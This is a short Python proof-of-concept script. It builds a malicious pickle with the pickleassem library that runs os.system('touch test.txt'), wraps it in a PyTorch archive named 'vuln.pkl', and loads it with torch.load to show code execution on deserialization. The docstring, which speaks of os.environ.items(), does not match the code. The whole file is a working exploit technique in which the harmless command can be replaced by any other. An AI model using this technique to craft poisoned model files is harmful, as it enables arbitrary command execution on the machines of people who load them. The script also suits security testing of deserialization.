"""Different ways to call os.environ.items() in an unrestricted pickler
-- Works"""

import io
import pickle
import struct
import sys
from typing import IO, Any, BinaryIO, Callable, Dict, Optional, Tuple, Type, Union, cast

import torch
from pickleassem import PickleAssembler
from torch.serialization import _open_zipfile_writer

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    pa.push_mark()
    pa.push_binstring("touch test.txt")
    pa.build_inst("os", "system")

    payload = pa.assemble()

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("vuln.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))

    torch.load("vuln.pkl")
